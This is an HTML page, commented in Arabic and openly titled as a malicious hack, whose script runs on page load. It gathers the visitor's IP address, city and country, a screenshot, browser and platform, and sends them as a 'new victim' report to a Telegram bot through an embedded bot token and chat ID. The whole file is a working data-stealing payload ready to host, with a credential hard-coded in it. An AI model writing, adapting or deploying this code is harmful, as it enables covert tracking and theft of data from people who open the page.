<!DOCTYPE html>
<html>
<head>
    <title>هاك خبيث</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script>
        async function stealData() {
            // جمع الـ IP والموقع
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            let location = "غير متاح";
            try {
                const locResponse = await fetch(`http://ip-api.com/json/${ip}`);
                const locData = await locResponse.json();
                location = `${locData.city}, ${locData.country}`;
            } catch (e) {}

            // لقطة الشاشة
            const screenshot = await html2canvas(document.body).then(canvas => canvas.toDataURL());

            // معلومات الجهاز
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;

            // إرسال البيانات إلى بوت التلجرام
            const botToken = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU"; // استبدل بتوكن البوت
            const chatId = "5446862709"; // استبدل بآيدي الدردشة
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            const text = `
                📌 **ضحيه جديده** 📌
                → IP: ${ip}
                → الموقع: ${location}
                → النظام: ${platform}
                → المتصفح: ${userAgent}
                ${screenshot ? `→ لقطة الشاشة: ${screenshot}` : ''}
            `;

            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
            });
        }

        // تشغيل عند فتح الصفحة
        window.onload = stealData;
    </script>
</head>
<body>
    <h1>مرحبًا! هذه صفحة مزيفة لجمع البيانات.</h1>
</body>
</html>
